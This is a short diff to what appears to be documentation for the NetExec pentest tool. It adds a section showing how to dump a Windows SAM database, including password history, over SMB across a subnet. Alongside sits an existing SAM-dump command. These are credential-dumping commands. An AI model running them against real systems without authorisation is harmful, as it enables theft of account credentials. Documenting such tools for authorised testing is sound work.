@@ -15,3 +15,9 @@ If this command fail you can also try the old method (similar to secretdump)
 ```bash
 nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam secdump
 ```
+
+### Dump SAM including password history
+
+```bash
+nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam --history
+```
